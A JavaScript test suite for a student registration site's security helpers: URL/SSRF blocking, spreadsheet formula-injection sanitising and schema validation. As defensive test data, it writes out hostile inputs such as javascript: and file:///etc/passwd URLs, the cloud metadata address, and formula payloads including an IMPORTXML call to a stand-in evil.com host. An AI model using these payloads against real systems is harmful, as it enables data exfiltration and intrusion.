/**
 * Security Verification Test Suite for STIC Webpage
 * Validates schema enforcement, formula injection protection,
 * SSRF/URL validation, and rate limiting logic.
 */

import { 
  validateSafeUrl, 
  sanitizeForSpreadsheet, 
  validateRegistrationPayload, 
  checkSubmissionRateLimit, 
  recordSubmissionTimestamp,
  ALLOWED_BRANCHES,
  ALLOWED_YEARS,
  ALLOWED_GUILDS
} from '../src/utils/security.js';

let passed = 0;
let failed = 0;

function assert(condition, message) {
  if (condition) {
    console.log(`[PASS] ${message}`);
    passed++;
  } else {
    console.error(`[FAIL] ${message}`);
    failed++;
  }
}

console.log('=== 1. Testing SSRF & Safe URL Validation ===');
// Block dangerous protocols
assert(!validateSafeUrl('javascript:alert(1)').valid, 'Blocks javascript: protocol');
assert(!validateSafeUrl('data:text/html,<script>alert(1)</script>').valid, 'Blocks data: protocol');
assert(!validateSafeUrl('vbscript:msgbox(1)').valid, 'Blocks vbscript: protocol');
assert(!validateSafeUrl('file:///etc/passwd').valid, 'Blocks file: protocol');

// Block Loopback and Private IP ranges (SSRF)
assert(!validateSafeUrl('http://127.0.0.1:8080').valid, 'Blocks 127.0.0.1 loopback');
assert(!validateSafeUrl('http://localhost:3000').valid, 'Blocks localhost');
assert(!validateSafeUrl('http://10.0.0.1/admin').valid, 'Blocks 10.0.0.0/8 private network');
assert(!validateSafeUrl('http://192.168.1.1/router').valid, 'Blocks 192.168.0.0/16 private network');
assert(!validateSafeUrl('http://169.254.169.254/latest/meta-data').valid, 'Blocks AWS/Cloud link-local metadata IP');

// Domain allowlist check
assert(
  validateSafeUrl('https://script.google.com/macros/s/123/exec', ['script.google.com']).valid,
  'Allows authorized Google Apps Script domain'
);
assert(
  !validateSafeUrl('https://evil-harvester.com/steal', ['script.google.com']).valid,
  'Rejects unapproved external domain'
);

console.log('\n=== 2. Testing CSV / Spreadsheet Formula Injection (CWE-1236) ===');
assert(sanitizeForSpreadsheet('=CMD("calc")') === "'=CMD(\"calc\")", 'Neutralizes "=" formula trigger');
assert(sanitizeForSpreadsheet('+SUM(A1:A10)') === "'+SUM(A1:A10)", 'Neutralizes "+" formula trigger');
assert(sanitizeForSpreadsheet('-2+5') === "'-2+5", 'Neutralizes "-" formula trigger');
assert(sanitizeForSpreadsheet('@IMPORTXML("http://evil.com","//a")') === "'@IMPORTXML(\"http://evil.com\",\"//a\")", 'Neutralizes "@" formula trigger');
assert(sanitizeForSpreadsheet('\tMALICIOUS') === "'\tMALICIOUS", 'Neutralizes tab character formula trigger');
assert(sanitizeForSpreadsheet('Normal Name') === 'Normal Name', 'Leaves benign text intact');

console.log('\n=== 3. Testing Schema Validation & Input Boundary Constraints ===');
const validPayload = {
  fullName: 'Ayush Mishra',
  rollNo: '220121501001',
  email: 'ayush@example.com',
  branch: 'CSE',
  year: '3rd Year',
  guild: 'STIC Coding Guild',
  interests: 'Competitive Programming',
  portfolio: 'https://github.com/ayush',
  message: 'Eager to build robust systems.',
  referralKey: 'MENTOR-2026'
};

const validRes = validateRegistrationPayload(validPayload);
assert(validRes.isValid, 'Accepts compliant student registration payload');

// Reject invalid inputs
const invalidPayload = {
  fullName: 'A', // Too short
  rollNo: '?!@#$', // Illegal chars
  email: 'bad-email-format', // Invalid email
  branch: 'MECHANICAL', // Not in allowlist
  year: '5th Year', // Not in allowlist
  guild: 'Unknown Track', // Not in allowlist
  interests: '',
  portfolio: 'javascript:alert(1)', // Malicious protocol
  referralKey: '$$$BAD$$$'
};

const invalidRes = validateRegistrationPayload(invalidPayload);
assert(!invalidRes.isValid, 'Rejects malformed registration payload');
assert(!!invalidRes.errors.fullName, 'Detects name length violation');
assert(!!invalidRes.errors.rollNo, 'Detects illegal roll number characters');
assert(!!invalidRes.errors.email, 'Detects invalid email address');
assert(!!invalidRes.errors.branch, 'Enforces branch allowlist constraint');
assert(!!invalidRes.errors.year, 'Enforces academic year allowlist constraint');
assert(!!invalidRes.errors.guild, 'Enforces guild allowlist constraint');
assert(!!invalidRes.errors.portfolio, 'Catches dangerous portfolio protocol');

console.log(`\n================================`);
console.log(`Test Results: ${passed} passed, ${failed} failed.`);
console.log(`================================`);

if (failed > 0) {
  process.exit(1);
} else {
  console.log('All defensive security controls verified successfully!');
}
